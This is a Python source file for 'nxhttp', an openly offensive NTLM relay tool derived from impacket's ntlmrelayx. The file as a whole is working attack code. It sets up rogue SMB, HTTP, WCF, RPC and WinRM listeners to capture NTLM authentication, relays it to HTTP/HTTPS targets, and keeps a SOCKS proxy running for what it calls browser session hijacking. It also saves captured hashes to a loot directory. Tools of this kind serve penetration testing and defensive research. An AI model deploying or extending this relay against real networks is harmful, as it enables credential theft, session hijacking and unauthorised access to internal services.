#!/usr/bin/env python
# nxhttp - HTTP NTLM Relay Tool
#
# Based on impacket's ntlmrelayx
# Stripped down for HTTP relay with interactive browser proxy (SOCKS)
#
# Catches NTLM auth from any source (SMB, HTTP, WCF, RPC, WinRM)
# Relays TO HTTP/HTTPS targets only
# SOCKS proxy for interactive browser session hijacking
#

import argparse
import sys
import logging
import cmd
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import json
from time import sleep
from threading import Thread

from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer, RPCRelayServer, WinRMRelayServer, WinRMSRelayServer
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS

# Vendored modules (kernel auth, session picker, socket locking)
from lib.relay.utils.config import NTLMRelayxConfig, parse_listening_ports
from lib.relay.servers.socksserver import SOCKS

RELAY_SERVERS = []

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads, api_address):
        cmd.Cmd.__init__(self)
        self.prompt = 'nxhttp> '
        self.api_address = api_address
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))
        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
        url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)


def start_servers(options, threads):
    for server in RELAY_SERVERS:
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(True, socksServer)  # Always SOCKS
        c.setTargets(targetSystem)
        c.setDisableMulti(options.no_multirelay)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setIPv6(options.ipv6)
        c.setKernelAuth(options.kernel_auth)
        c.setSMB2Support(options.smb2support)
        c.setInterfaceIp(options.interface_ip)

        if server is HTTPRelayServer:
            for port in options.http_port:
                c.setListeningPort(port)
                s = server(c)
                s.start()
                threads.add(s)
                sleep(0.1)
            continue

        elif server is SMBRelayServer:
            c.setListeningPort(options.smb_port)
        elif server is WCFRelayServer:
            c.setListeningPort(options.wcf_port)
        elif server is RAWRelayServer:
            c.setListeningPort(options.raw_port)
        elif server is RPCRelayServer:
            c.setListeningPort(options.rpc_port)

        s = server(c)
        s.start()
        threads.add(s)
    return c


if __name__ == '__main__':
    print("""
  +----------------------------------+
  |  nxhttp - HTTP NTLM Relay Tool   |
  +----------------------------------+
""")

    parser = argparse.ArgumentParser(add_help=False,
        description="NTLM Relay to HTTP with SOCKS proxy for browser session hijacking")
    parser._optionals.title = "Main options"

    # Main arguments
    parser.add_argument("-h", "--help", action="help", help='show this help message and exit')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t', "--target", action='store', metavar='TARGET', required=True,
                        help="Target HTTP(S) URL to relay to (e.g., https://iis-server/)")
    parser.add_argument('-tf', action='store', metavar='TARGETSFILE',
                        help='File with target URLs, one per line')
    parser.add_argument('-w', action='store_true', help='Watch target file for changes')

    # Interface
    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP',
                        help='IP address to bind servers', default='')

    # Server options (incoming auth capture)
    serversoptions = parser.add_argument_group("Relay servers (incoming auth)")
    serversoptions.add_argument('--no-smb-server', action='store_true', help='Disable SMB server')
    serversoptions.add_argument('--no-http-server', action='store_true', help='Disable HTTP server')
    serversoptions.add_argument('--no-wcf-server', action='store_true', help='Disable WCF server')
    serversoptions.add_argument('--no-raw-server', action='store_true', help='Disable RAW server')
    serversoptions.add_argument('--no-rpc-server', action='store_true', help='Disable RPC server')
    serversoptions.add_argument('--no-winrm-server', action='store_true', help='Disable WinRM server')

    parser.add_argument('--smb-port', type=int, default=445, help='SMB server port (default: 445)')
    parser.add_argument('--http-port', default="80", help='HTTP server port(s) (default: 80)')
    parser.add_argument('--wcf-port', type=int, default=9389, help='WCF server port (default: 9389)')
    parser.add_argument('--raw-port', type=int, default=6666, help='RAW server port (default: 6666)')
    parser.add_argument('--rpc-port', type=int, default=135, help='RPC server port (default: 135)')

    # SOCKS options
    socksoptions = parser.add_argument_group("SOCKS proxy (browser hijacking)")
    socksoptions.add_argument('-socks-address', default='127.0.0.1', help='SOCKS5 address (default: 127.0.0.1)')
    socksoptions.add_argument('-socks-port', default=1080, type=int, help='SOCKS5 port (default: 1080)')
    socksoptions.add_argument('-http-api-port', default=9090, type=int, help='HTTP API port (default: 9090)')

    # Relay options
    relayoptions = parser.add_argument_group("Relay options")
    relayoptions.add_argument('--kernel-auth', action='store_true',
                              help='IIS kernel mode auth workaround (try anonymous first)')
    relayoptions.add_argument('--no-multirelay', action="store_true", help='Disable multi-host relay')
    relayoptions.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
    relayoptions.add_argument('-6', '--ipv6', action='store_true', help='Listen on IPv6')
    relayoptions.add_argument('-l', '--lootdir', default='.', help='Loot directory')
    relayoptions.add_argument('-of', '--output-file', action='store', help='Output file for hashes')

    try:
        options = parser.parse_args()
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)

    logger.init(options.ts, options.debug)

    codec = sys.getdefaultencoding()

    # Target setup
    if options.target is not None:
        logging.info("Target: %s" % options.target)
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS)
        if targetSystem.generalCandidates:
            options.no_multirelay = True
    elif options.tf is not None:
        logging.info("Targets from file: %s" % options.tf)
        targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS)
        mode = 'RELAY'
    else:
        parser.error("Target (-t) is required")

    # Set up relay servers
    if not options.no_smb_server:
        RELAY_SERVERS.append(SMBRelayServer)
    if not options.no_http_server:
        RELAY_SERVERS.append(HTTPRelayServer)
        try:
            options.http_port = parse_listening_ports(options.http_port)
        except ValueError:
            logging.error("Invalid HTTP port specification")
            sys.exit(1)
    if not options.no_wcf_server:
        RELAY_SERVERS.append(WCFRelayServer)
    if not options.no_raw_server:
        RELAY_SERVERS.append(RAWRelayServer)
    if not options.no_winrm_server:
        RELAY_SERVERS.append(WinRMRelayServer)
        RELAY_SERVERS.append(WinRMSRelayServer)
    if not options.no_rpc_server:
        RELAY_SERVERS.append(RPCRelayServer)

    if options.w and options.tf:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    threads = set()

    # SOCKS is always on
    socksServer = SOCKS(server_address=(options.socks_address, options.socks_port),
                        api_port=options.http_api_port)
    socksServer.daemon_threads = True
    socks_thread = Thread(target=socksServer.serve_forever)
    socks_thread.daemon = True
    socks_thread.start()
    threads.add(socks_thread)

    c = start_servers(options, threads)

    if options.kernel_auth:
        logging.info("Kernel Auth workaround ENABLED")

    print("")
    logging.info("Servers started, waiting for connections")
    logging.info("SOCKS proxy: %s:%d" % (options.socks_address, options.socks_port))

    try:
        shell = MiniShell(c, threads, api_address='{}:{}'.format(options.socks_address, options.http_api_port))
        shell.cmdloop()
    except KeyboardInterrupt:
        pass

    socksServer.shutdown()
    sys.exit(0)
